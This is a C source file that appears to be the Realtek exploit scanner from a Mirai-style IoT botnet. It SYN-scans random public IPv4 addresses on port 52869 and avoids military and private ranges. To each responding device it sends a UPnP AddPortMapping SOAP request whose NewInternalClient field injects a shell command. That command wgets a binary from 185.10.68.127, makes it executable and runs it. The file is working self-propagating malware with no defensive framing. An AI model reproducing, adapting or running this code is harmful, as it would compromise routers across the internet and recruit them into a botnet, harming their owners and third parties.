#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "realtek_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

int realtekscanner_scanner_pid = 0, realtekscanner_rsck = 0, realtekscanner_rsck_out = 0;
char realtekscanner_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct realtekscanner_scanner_connection *conn_table;
uint32_t realtekscanner_fake_time = 0;

int realtekscanner_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void realtekscanner_scanner_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    realtekscanner_scanner_pid = fork();
    if(realtekscanner_scanner_pid > 0 || realtekscanner_scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    realtekscanner_fake_time = time(NULL);
    conn_table = calloc(realtekscanner_SCANNER_MAX_CONNS, sizeof(struct realtekscanner_scanner_connection));
    for(i = 0; i < realtekscanner_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = realtekscanner_SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if((realtekscanner_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[scanner] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    fcntl(realtekscanner_rsck, F_SETFL, O_NONBLOCK | fcntl(realtekscanner_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(realtekscanner_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[scanner] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(realtekscanner_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    iph = (struct iphdr *)realtekscanner_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(52869);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    #ifdef DEBUG
        printf("[scanner] scanner process initialized. scanning started.\n");
    #endif

    // Main logic loop
    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct realtekscanner_scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if(realtekscanner_fake_time != last_spew)
        {
            last_spew = realtekscanner_fake_time;

            for(i = 0; i < realtekscanner_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)realtekscanner_scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = realtekscanner_get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                tcph->dest = htons(52869);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(realtekscanner_rsck, realtekscanner_scanner_rawpkt, sizeof(realtekscanner_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while(TRUE)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct realtekscanner_scanner_connection *conn;

            errno = 0;
            n = recvfrom(realtekscanner_rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != htons(52869))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for(n = last_avail_conn; n < realtekscanner_SCANNER_MAX_CONNS; n++)
            {
                if(conn_table[n].state == realtekscanner_SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if(conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            realtekscanner_setup_connection(conn);
        }

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for(i = 0; i < realtekscanner_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;

            conn = &conn_table[i];
            //timeout = (conn->state > realtekscanner_SC_CONNECTING ? 30 : 5);

            if(conn->state != realtekscanner_SC_CLOSED && (realtekscanner_fake_time - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;
                conn->state = realtekscanner_SC_CLOSED;
                util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                continue;
            }

            if(conn->state == realtekscanner_SC_CONNECTING || conn->state == realtekscanner_SC_EXPLOIT_STAGE2 || conn->state == realtekscanner_SC_EXPLOIT_STAGE3)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != realtekscanner_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        realtekscanner_fake_time = time(NULL);

        for(i = 0; i < realtekscanner_SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if(conn->fd == -1)
                continue;

            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == realtekscanner_SC_EXPLOIT_STAGE2)
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d sending payload\n", conn->fd);
                        #endif

						
                        util_strcpy(conn->payload_buf, "POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf nig; wget http://185.10.68.127/rtbin -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                        close(conn->fd);
                        realtekscanner_setup_connection(conn);
                        conn->state = realtekscanner_SC_EXPLOIT_STAGE3;

                        continue;
                    }
                    else if(conn->state == realtekscanner_SC_EXPLOIT_STAGE3)
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d finnished\n", conn->fd);
                        #endif
						
                        util_strcpy(conn->payload_buf, "POST /wanipcn.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf nig; wget http://185.10.68.127/rtbin -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n");
                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = realtekscanner_SC_CLOSED;

                        continue;
                    }
                    else
                    {
                        #ifdef DEBUG
                            printf("[scanner] FD%d connected to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        #endif

                        conn->state = realtekscanner_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = realtekscanner_SC_CLOSED;

                    continue;
                }
            }

            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(TRUE)
                {
                    int ret = 0;

                    if(conn->state == realtekscanner_SC_CLOSED)
                        break;

                    if(conn->rdbuf_pos == realtekscanner_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + realtekscanner_SCANNER_HACK_DRAIN, realtekscanner_SCANNER_RDBUF_SIZE - realtekscanner_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= realtekscanner_SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = realtekscanner_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, realtekscanner_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == realtekscanner_SC_EXPLOIT_STAGE2)
                            {
                                close(conn->fd);
                                realtekscanner_setup_connection(conn);
                                continue;
                            }

                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = realtekscanner_SC_CLOSED;
                            util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = realtekscanner_fake_time;

                    int len = util_strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;
                }
            }
        }
    }
}

void realtekscanner_scanner_kill(void)
{
    kill(realtekscanner_scanner_pid, 9);
}

static void realtekscanner_setup_connection(struct realtekscanner_scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if(conn->fd != -1)
        close(conn->fd);

    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = realtekscanner_fake_time;

    if(conn->state == realtekscanner_SC_EXPLOIT_STAGE2 || conn->state == realtekscanner_SC_EXPLOIT_STAGE3)
    {
    }
    else
    {
        conn->state = realtekscanner_SC_CONNECTING;
    }

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

static ipv4_t realtekscanner_get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

